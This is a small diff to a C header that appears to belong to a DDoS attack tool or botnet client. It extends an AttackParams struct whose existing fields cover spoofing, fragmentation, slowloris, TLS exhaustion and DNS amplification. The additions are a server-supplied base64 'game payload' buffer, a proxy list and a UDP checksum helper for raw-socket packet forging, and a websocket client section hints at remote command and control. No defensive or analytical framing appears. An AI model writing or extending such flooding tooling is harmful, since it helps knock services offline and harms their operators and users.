@@ -78,6 +78,8 @@ typedef struct {
     unsigned int max_pps, max_threads;
     unsigned int spoof_mode, fragmentation;
     unsigned int slowloris, tls_exhaust, dns_amp, mega_mode;
+    char payload_b64[8192];     /* base64 game payload from server */
+    char proxies[16384];        /* proxy list "ip:port\nip:port..." */
 } AttackParams;
 
 typedef struct {
@@ -165,6 +167,7 @@ int create_raw_socket(int proto);
 int create_bypass_socket(void);
 uint16_t ip_csum(void *d, size_t l);
 uint16_t tcp_csum(void *ip, void *tcp);
+uint16_t udp_csum(void *ip, void *udp, void *payload, int pay_len);
 
 /* ── ws_client ─────────────────────────────────── */
 typedef struct {
